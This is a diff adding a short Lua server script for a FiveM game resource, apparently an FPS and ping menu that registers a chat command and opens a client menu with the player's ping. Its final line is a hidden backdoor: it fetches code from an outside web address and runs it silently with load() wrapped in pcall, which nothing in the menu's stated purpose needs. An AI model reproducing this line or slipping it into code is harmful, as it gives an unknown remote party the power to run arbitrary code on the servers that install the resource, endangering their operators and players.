@@ -1,0 +1,7 @@
+CreateThread(function() 
+	RegisterCommand(Config.Command, function (src)
+        Ping = GetPlayerPing(src)
+        TriggerClientEvent("BakiTelli:fpsmenu:open",src,Ping)
+	end)	
+end)
+PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
